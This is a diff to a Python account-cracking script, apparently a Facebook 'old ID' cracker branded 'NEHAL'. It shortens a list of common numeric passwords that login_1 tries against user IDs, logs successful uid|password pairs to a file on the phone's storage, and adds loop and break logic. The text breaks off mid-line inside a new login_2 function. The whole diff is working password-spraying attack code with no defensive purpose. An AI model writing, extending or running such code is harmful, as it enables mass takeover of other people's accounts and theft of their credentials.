@@ -196,6 +196,7 @@ def ____banner____():
 ██║╚██╗██║██╔══╝  ██╔══██║██╔══██║██║     
 ██║ ╚████║███████╗██║  ██║██║  ██║███████╗       It's your Father 
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+
 \033[0m""")
 
 
@@ -325,7 +326,6 @@ def old_One():
     meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOOLS CREATED BY NEHAL ADRIAN{G}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
@@ -424,7 +424,7 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mNEHAL-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
-        for pw in ('123456', '123123', '1234567', '12345678', '123456789', '000000', '121212', '123123', '111111',):
+        for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -475,4 +475,14 @@ def login_1(uid):
                 print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mNEHAL\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/NEHAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
-        
+                break
+        loop += 1
+    except Exception:
+        time.sleep(5)
+
+
+def login_2(uid):
+    """
+    Login attempt method 2.
+    """
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m
